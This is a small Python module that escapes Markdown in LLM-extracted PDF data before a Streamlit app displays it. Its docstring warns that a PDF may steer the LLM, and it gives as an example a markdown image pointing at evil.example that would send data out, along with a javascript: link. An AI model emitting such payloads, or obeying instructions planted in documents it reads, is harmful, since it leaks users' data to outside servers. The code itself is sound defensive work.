from __future__ import annotations

from src.core.sanitize import escape_markdown

DASH = "—"


def safe(value: object) -> str:
    """Make any text from the API safe for `st.markdown`, `st.caption`, `st.write`...

    The extracted data is untrusted (a PDF may have steered the LLM): a supplier named
    `![x](http://evil.example/?d=1)` would otherwise be rendered as an image that sends data
    to another server, and `[click](javascript:...)` as a link. Markdown syntax is escaped so
    the text is shown literally. `st.text` and dataframes show text literally already.
    """
    return escape_markdown("" if value is None else str(value))


def safe_or_dash(value: object) -> str:
    """Like `safe`, with a dash for a missing value (nothing extracted / left empty)."""
    return DASH if value is None or str(value).strip() == "" else safe(value)
